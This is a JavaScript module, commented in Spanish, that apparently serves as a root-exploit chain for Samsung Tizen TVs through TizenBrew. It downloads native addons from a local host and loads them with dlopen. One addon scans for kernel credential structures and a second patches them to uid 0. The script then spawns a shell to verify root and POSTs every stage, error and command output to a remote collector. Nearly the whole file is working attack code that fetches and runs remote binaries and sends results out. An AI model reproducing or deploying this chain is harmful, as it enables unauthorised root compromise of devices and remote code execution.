/**
 * service.js v4 — módulo TizenBrew EnvProbe — CADENA COMPLETA
 *
 * Flujo (todo automático):
 *   1. descarga rootchain_node.node (scan read-only), dlopea y lee /tmp/rcscan.out
 *   2. si rcscan tiene hits de cred (>0) → descarga rootchain_node_w.node (patch),
 *      dlopea (patch = zero cred uid 5001/gid 100)
 *   3. cp.exec('/bin/sh -c id') → si sale uid=0 → REPORTA al colector
 *      (con root en el propio proceso, el sh hereda cred)
 *   4. todo va por POST al colector (incl. los pasos y errores)
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');

var DEST_HOST = '192.168.1.35';
var DEST_PORT = 9999;
var SRC_HOST  = '192.168.1.35';
var SRC_PORT  = 8000;

var stages = [];

function stage(name, data) {
    stages.push({ t: Date.now(), name: name, data: (typeof data === 'string') ? data.slice(0,6000) : data });
    reportNow('stage:' + name);
}

function reportNow(tag) {
    var body = JSON.stringify({ id: 'v4', tag: tag, stages: stages });
    var req = http.request({ host: DEST_HOST, port: DEST_PORT, path: '/probe4', method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function (e) { });
    req.write(body); req.end();
}

function httpGetBinary(path, cb) {
    http.get({ host: SRC_HOST, port: SRC_PORT, path: path }, function (res) {
        if (res.statusCode !== 200) { cb(new Error('HTTP ' + res.statusCode)); return; }
        var cs = []; res.on('data', function (c) { cs.push(c); });
        res.on('end', function () { cb(null, Buffer.concat(cs)); });
    }).on('error', cb);
}

function dlAndWrite(path, cb) {
    httpGetBinary(path, function (err, buf) {
        if (err) return cb(err);
        var fp = '/run/user/5001/' + path.split('/').pop();
        try { fs.writeFileSync(fp, buf); fs.chmodSync(fp, 0o755); }
        catch (e) { return cb(e); }
        cb(null, fp, buf);
    });
}

(function main() {
    stage('info', { node: process.version, abis: process.versions.modules });

    // 1) fetch scan-only addon
    httpGetBinary('/fw-analysis/bin/rootchain_node.node', function (err, buf) {
        if (err) { stage('dl_scan_err', String(err)); return reportNow('end'); }
        var pScan = '/run/user/5001/rootchain_node.node';
        try { fs.writeFileSync(pScan, buf); fs.chmodSync(pScan, 0o644); }
        catch (e) { stage('write_scan_err', String(e)); return reportNow('end'); }

        // dlopen scan
        try { (process).dlopen({}, pScan); stage('dlopen_scan_ok', pScan); }
        catch (e) { stage('dlopen_scan_err', String(e && e.message ? e.message : e)); return reportNow('end'); }

        setTimeout(function () {
            var scan = 'no file';
            try { scan = fs.readFileSync('/tmp/rcscan.out', 'utf8'); }
            catch (e) { scan = 'no: ' + e.message; }
            stage('rcscan', scan);
            var hits = 0;
            try { hits = parseInt(String(scan).match(/hits:\s*(\d+)/)[1], 10) || 0; } catch (e) {}

            if (hits === 0) { stage('no_hits', 'no cred matches — nada que parchear'); return reportNow('end'); }

            // 2) fetch writer addon y dlopen otra vez (path distinto → no cache)
            httpGetBinary('/fw-analysis/bin/rootchain_node_w.node', function (err2, buf2) {
                if (err2) { stage('dl_writer_err', String(err2)); return reportNow('end'); }
                var pW = '/run/user/5001/rootchain_node_w.node';
                try { fs.writeFileSync(pW, buf2); fs.chmodSync(pW, 0o644); }
                catch (e) { stage('write_w_err', String(e)); return reportNow('end'); }
                try { (process).dlopen({}, pW); stage('dlopen_writer_ok', pW); }
                catch (e) { stage('dlopen_writer_err', String(e && e.message ? e.message : e)); return reportNow('end'); }

                // 3) test de root: sh hijo hereda cred parcheada
                setTimeout(function () {
                    cp.exec('/bin/sh -c "id; whoami; cat /proc/self/uid_map 2>/dev/null; ls -ld /usr/apps"',
                        { timeout: 10000 }, function (err3, so3, se3) {
                            stage('rootTest', {
                                err: err3 ? String(err3.message || err3) : null,
                                out: String(so3), errout: String(se3)
                            });
                            return reportNow('end');
                        });
                }, 3000);
            });
        }, 4000);
    });
})();
